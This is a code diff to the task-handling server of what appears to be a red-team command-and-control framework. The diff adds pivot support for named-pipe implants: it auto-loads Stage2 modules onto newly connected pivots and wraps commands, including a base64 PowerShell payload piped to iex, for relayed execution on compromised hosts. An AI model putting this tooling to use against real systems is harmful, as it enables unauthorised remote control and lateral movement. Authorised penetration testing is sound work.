@@ -76,18 +76,27 @@ def newTaskOutput(uriPath, cookieVal, post_data, wsclient=False):
             if "loadmodule" in executedCmd and len(outputParsed.split()) == 0:
                 print("Module loaded successfully")
                 DB.update_task(taskId, "Module loaded successfully")
-            elif "pbind-connect " in executedCmd and "PBind-Connected" in outputParsed:
+            elif "pbind-connect " in executedCmd and "PBind-Connected" in outputParsed or "PBind PBind start" in executedCmd and "PBind-Connected" in outputParsed:
                 outputParsed = re.search("PBind-Connected:.*", outputParsed)
                 outputParsed = outputParsed[0].replace("PBind-Connected: ", "")
                 Domain, User, Hostname, Arch, PID, Proxy = str(outputParsed).split(";")
                 Proxy = Proxy.replace("\x00", "")
                 if "\\" in User:
                     User = User[User.index("\\") + 1:]
-                newImplant = Implant(implantID, "C# PBind", str(Domain), str(User), str(Hostname), Arch, PID, None)
+
+                PivotString = "C# PBind"
+                if "pbind-command run-exe PBind PBind start" in executedCmd:
+                    PivotString = "C# PBind Pivot"
+
+                newImplant = Implant(implantID, PivotString, str(Domain), str(User), str(Hostname), Arch, PID, None)
                 newImplant.save()
                 newImplant.display()
                 newImplant.autoruns()
-                DB.new_task("pbind-loadmodule Stage2-Core.exe", "autoruns", RandomURI)
+                if "pbind-command run-exe PBind PBind start" in executedCmd: 
+                    DB.new_task("pbind-pivot-loadmodule Stage2-Core.exe", "autoruns", RandomURI)
+                else:
+                    DB.new_task("pbind-loadmodule Stage2-Core.exe", "autoruns", RandomURI)
+
             elif executedCmd.lower().startswith("beacon "):
                 new_sleep = executedCmd.replace('beacon ', '').strip()
                 DB.update_sleep(new_sleep, RandomURI)
@@ -220,6 +229,7 @@ def newTask(path):
     if all_implants:
         for i in all_implants:
             RandomURI = i.RandomURI
+            Pivot = i.Pivot
             EncKey = i.Key
             tasks = DB.get_newtasks(RandomURI)
             if RandomURI in path and tasks:
@@ -312,6 +322,15 @@ def newTask(path):
                             print("Cannot base64 the command for PS")
                             print(e)
                             traceback.print_exc()
+                    elif task[2].startswith("pbind-pivot-command run-exe Program PS "):
+                        try:
+                            cmd = (task[2]).replace("pbind-pivot-command run-exe Program PS ", "")
+                            modulestr = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
+                            command = "run-exe PBind PBind run-exe PBind PBind run-exe Program PS %s" % modulestr
+                        except Exception as e:
+                            print("Cannot base64 the command for PS")
+                            print(e)
+                            traceback.print_exc()                            
                     elif task[2].startswith("pbind-command run-exe Program PS "):
                         try:
                             cmd = (task[2]).replace("pbind-command run-exe Program PS ", "")
@@ -341,6 +360,31 @@ def newTask(path):
                                     module_name = modname
                             modulestr = load_module_sharp(module_name)
                             command = "run-exe PBind PBind \"run-exe Program PS loadmodule%s\"" % modulestr
+                        except Exception as e:
+                            print("Cannot find module, loadmodule is case sensitive!")
+                            print(e)
+                            traceback.print_exc()
+                    elif task[2].startswith("pbind-pivot-loadmodule "):
+                        try:
+                            module_name = (task[2]).replace("pbind-pivot-loadmodule ", "")
+                            if ".exe" in module_name:
+                                for modname in os.listdir(ModulesDirectory):
+                                    if modname.lower() in module_name.lower():
+                                        module_name = modname
+                                modulestr = load_module_sharp(module_name)
+                                command = "run-exe PBind PBind run-exe PBind PBind \"loadmodule%s\"" % modulestr
+                            elif ".dll" in module_name:
+                                for modname in os.listdir(ModulesDirectory):
+                                    if modname.lower() in module_name.lower():
+                                        module_name = modname
+                                modulestr = load_module_sharp(module_name)
+                                command = "run-exe PBind PBind run-exe PBind PBind \"loadmodule%s\"" % modulestr
+                            else:
+                                for modname in os.listdir(ModulesDirectory):
+                                    if modname.lower() in module_name.lower():
+                                        module_name = modname
+                                modulestr = load_module(module_name)
+                                command = "run-exe PBind PBind run-exe PBind PBind \"`$mk = '%s';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$mk))|iex\"" % base64.b64encode(bytes(modulestr, "utf-8")).decode('utf-8')
                         except Exception as e:
                             print("Cannot find module, loadmodule is case sensitive!")
                             print(e)
@@ -376,6 +420,13 @@ def newTask(path):
                         command = command.replace("pbind-connect ", "run-exe PBind PBind start ")
                     elif task[2].startswith("pbind-kill"):
                         command = command.replace("pbind-kill", "run-exe PBind PBind kill-implant")
+
+                    elif task[2].startswith("pbind-pivot-command "):
+                        command = command.replace("pbind-pivot-command ", "run-exe PBind PBind run-exe PBind PBind ")
+                    elif task[2].startswith("pbind-pivot-connect"):
+                        command = command.replace("pbind-pivot-connect ", "run-exe PBind PBind run-exe PBind PBind start ")
+                    elif task[2].startswith("pbind-pivot-kill"):
+                        command = command.replace("pbind-pivot-kill", "run-exe PBind PBind run-exe PBind PBind kill-implant")
 
                     # Uncomment to print actual commands that are being sent
                     # if "AAAAAAAAAAAAAAAAAAAA" not in command:
